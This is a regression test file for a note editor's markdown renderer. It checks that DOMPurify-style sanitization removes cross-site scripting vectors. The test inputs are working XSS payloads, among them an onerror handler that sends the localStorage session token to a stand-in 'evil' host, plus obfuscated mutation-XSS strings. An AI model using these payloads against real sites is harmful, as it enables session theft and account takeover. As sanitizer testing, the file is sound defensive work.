// @vitest-environment jsdom
//
// Guards SEC-01. marked does not sanitize its output, so without DOMPurify any
// HTML in a note body executed on the Preview tab — and with the session JWT in
// localStorage that meant account takeover. These are regression tests: each
// payload below is live XSS against the previous implementation.

import { describe, it, expect } from "vitest";
import { renderMarkdown } from "./NoteEditor";

const render = (md: string) => renderMarkdown(md).toLowerCase();

describe("renderMarkdown — script execution", () => {
  it("strips script tags", () => {
    const out = render('# Hi\n\n<script>alert(document.domain)</script>');
    expect(out).not.toContain("<script");
    expect(out).toContain("<h1");
  });

  it("strips event handler attributes", () => {
    for (const payload of [
      '<img src=x onerror="fetch(\'//evil/?t=\'+localStorage[\'myx.token\'])">',
      '<div onclick="alert(1)">click</div>',
      '<body onload="alert(1)">',
      '<svg/onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
    ]) {
      const out = render(payload);
      expect(out).not.toMatch(/\son\w+\s*=/);
    }
  });

  it("neutralises javascript: URLs in links", () => {
    const out = render("[click me](javascript:alert(document.cookie))");
    expect(out).not.toContain("javascript:");
  });

  it("neutralises javascript: URLs written as raw HTML", () => {
    const out = render('<a href="javascript:alert(1)">x</a>');
    expect(out).not.toContain("javascript:");
  });

  it("blocks data: URLs that can execute", () => {
    const out = render('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>');
    expect(out).not.toContain("data:text/html");
  });

  it("removes embedding tags that can host a payload", () => {
    for (const tag of ["iframe", "object", "embed", "form"]) {
      expect(render(`<${tag} src="//evil"></${tag}>`)).not.toContain(`<${tag}`);
    }
  });

  it("drops style attributes and blocks, which can exfiltrate via CSS", () => {
    expect(render('<div style="background:url(//evil)">x</div>')).not.toContain("style=");
    expect(render("<style>body{background:url(//evil)}</style>")).not.toContain("<style");
  });

  it("survives obfuscated and malformed payloads", () => {
    for (const payload of [
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<IMG SRC=JaVaScRiPt:alert(1)>',
      '<img src="x" OnErRoR="alert(1)">',
      '<a href="&#106;avascript:alert(1)">x</a>',
      '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    ]) {
      const out = render(payload);
      expect(out).not.toContain("<script");
      expect(out).not.toMatch(/\son\w+\s*=/);
      expect(out).not.toMatch(/javascript\s*:/);
    }
  });
});

describe("renderMarkdown — legitimate content still renders", () => {
  it("renders standard markdown", () => {
    const out = render("# Title\n\n**bold** and *italic*\n\n- one\n- two\n\n`code`");
    expect(out).toContain("<h1");
    expect(out).toContain("<strong");
    expect(out).toContain("<em");
    expect(out).toContain("<li");
    expect(out).toContain("<code");
  });

  it("keeps http(s) links and images", () => {
    expect(render("[docs](https://example.com/a?b=1)")).toContain('href="https://example.com/a?b=1"');
    expect(render("![alt](https://example.com/i.png)")).toContain('src="https://example.com/i.png"');
  });

  it("keeps mailto and tel links", () => {
    expect(render("[mail](mailto:a@b.co)")).toContain("mailto:a@b.co");
    expect(render("[call](tel:+919999999999)")).toContain("tel:+919999999999");
  });

  it("keeps relative and anchor links", () => {
    expect(render("[top](#section)")).toContain('href="#section"');
    expect(render("[note](/notes/12)")).toContain('href="/notes/12"');
    // A colon-free path cannot carry a scheme, so it is safe to keep.
    expect(render("[note](notes/12)")).toContain('href="notes/12"');
    expect(render("[up](../index.md)")).toContain('href="../index.md"');
  });

  it("hardens outgoing links against reverse tabnabbing", () => {
    const out = render("[x](https://example.com)");
    expect(out).toContain('target="_blank"');
    expect(out).toContain("noopener");
    expect(out).toContain("noreferrer");
  });

  it("renders fenced code blocks as text, not markup", () => {
    const out = render("```\n<script>alert(1)</script>\n```");
    expect(out).toContain("<pre");
    expect(out).not.toContain("<script>alert(1)</script>");
    expect(out).toContain("&lt;script&gt;");
  });

  it("handles empty and whitespace-only input", () => {
    expect(renderMarkdown("")).toBe("");
    expect(renderMarkdown("   \n  ").trim()).toBe("");
  });

  it("preserves GFM line breaks, which the editor enables", () => {
    expect(render("line one\nline two")).toContain("<br");
  });
});
